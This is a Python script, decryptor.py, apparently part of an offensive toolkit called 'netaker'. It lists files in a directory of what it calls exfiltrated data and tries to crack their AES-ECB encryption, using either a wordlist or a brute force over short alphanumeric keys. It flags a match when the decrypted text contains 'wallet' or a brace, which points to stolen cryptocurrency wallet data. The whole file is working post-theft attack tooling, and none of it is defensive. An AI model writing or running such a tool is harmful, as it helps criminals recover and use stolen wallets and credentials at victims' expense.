# decryptor.py

import os
from Crypto.Cipher import AES
import itertools

DATA_PORTAL_DIR = "netaker_data"

def list_exfiltrated_files():
    return [f for f in os.listdir(DATA_PORTAL_DIR) if os.path.isfile(os.path.join(DATA_PORTAL_DIR, f))]

def try_wordlist_decrypt(filename, wordlist_path):
    with open(os.path.join(DATA_PORTAL_DIR, filename), 'rb') as f:
        ciphertext = f.read()

    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as w:
        for line in w:
            key = line.strip().encode().ljust(16, b'\0')[:16]
            try:
                cipher = AES.new(key, AES.MODE_ECB)
                plaintext = cipher.decrypt(ciphertext)
                if b"{" in plaintext or b"wallet" in plaintext:
                    print(f"[+] Key Found: {key.decode(errors='ignore')}")
                    print(f"[+] Decrypted (partial):\n{plaintext[:200]}")
                    return
            except Exception:
                continue
    print("[-] No key found in wordlist.")

def brute_force_charset(filename, max_len=6):
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    with open(os.path.join(DATA_PORTAL_DIR, filename), 'rb') as f:
        ciphertext = f.read()

    for length in range(1, max_len + 1):
        for guess in itertools.product(charset, repeat=length):
            key = ''.join(guess).encode().ljust(16, b'\0')[:16]
            try:
                cipher = AES.new(key, AES.MODE_ECB)
                plaintext = cipher.decrypt(ciphertext)
                if b"{" in plaintext or b"wallet" in plaintext:
                    print(f"[+] Key Found: {key.decode(errors='ignore')}")
                    print(f"[+] Decrypted (partial):\n{plaintext[:200]}")
                    return
            except:
                continue
    print("[-] Brute-force failed.")

if __name__ == "__main__":
    print("[*] Files in netaker_data/:")
    files = list_exfiltrated_files()
    for i, f in enumerate(files):
        print(f"{i}) {f}")

    choice = input("Select file number to decrypt: ")
    try:
        target = files[int(choice)]
    except:
        print("Invalid selection.")
        exit()

    method = input("Use wordlist (w) or charset (c)? ").strip().lower()
    if method == 'w':
        wordlist = input("Path to wordlist: ").strip()
        try_wordlist_decrypt(target, wordlist)
    elif method == 'c':
        brute_force_charset(target)
    else:
        print("Unknown method.")
